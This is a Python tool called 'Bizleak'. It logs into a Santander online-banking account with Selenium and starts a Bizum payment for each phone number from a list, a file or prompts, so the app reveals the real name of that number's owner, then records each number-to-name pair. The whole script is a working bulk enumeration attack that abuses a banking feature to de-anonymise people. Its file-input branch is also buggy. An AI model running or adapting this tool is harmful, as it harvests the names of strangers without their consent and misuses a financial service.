#!/usr/bin/env python3

# Bizleak

import os
import getpass
import argparse
from selenium import webdriver
from selenium.common.exceptions import *
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

from bl_lib.santander import *
from bl_lib.selaux import *

def get_name(driver, account, number, output):
    if output:
        output = open(output, 'a')
    try:
        account.bizum_send(number)
        name = account.bizum_get_name()
        text = '[+] ' + number + ' -> ' + name + '\n'
        if output:
            output.write(text)
        else:
            print(text)
        driver.execute_script("window.history.go(-1)")
        driver.execute_script("window.history.go(-1)")
    except (ElementClickInterceptedException, TimeoutException, NoSuchElementException):
        print('[i] Unable to get ' + number + '.')
    if output:
        output.close()
    #account.bizum_delete_number()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--firefox', dest='browser', action='store_false', help='Use Firefox.')
    parser.add_argument('--chrome', dest='browser', default=True, action='store_true', help='Use Chrome.')
    parser.add_argument('--id', dest='id', help='ID number for login.')
    parser.add_argument('--password', dest='password', help='Password for login.')
    parser.add_argument('--phones', dest='phones', help='Phone numbers list divided by commas.')
    parser.add_argument('--file', dest='file', help='Phone numbers list in a file divided by lines.')
    parser.add_argument('--output', dest='output', default=False, help='Output file to store results.')
    args = parser.parse_args()
    id = args.id
    password = args.password
    browser = args.browser
    output = args.output
    execution_mode = 0
    if not args.file:
        if args.phones:
            phones = args.phones.split(",")
            execution_mode = 1
    else:
        phones = open(args.phones, 'r').readlines()
        print(phones)
    if not id:
        id = input('Account ID: ')
    if not password:
        password = getpass.getpass('Account password: ')
    if browser:
        driver = headless_chrome()
    else:
        driver = headless_firefox()
    account = Santander(driver, id)
    try:
        account.login(password)
    except Exception as e:
        print('[!] Unable to log in.')
        return e
    print('[i] Logged in successfully.')
    account.open_bizum()
    if execution_mode == 1:
        for number in phones:
            number = number.replace(' ', '')
            get_name(driver, account, number, output)
    else:
        number = input('[*] Phone number (Press [ENTER] to finish): ')
        while number:
            get_name(driver, account, number.replace(' ', ''), output)
            number = input('[*] Phone number (Press [ENTER] to finish): ')
    driver.close()

if __name__ == '__main__':
    main()
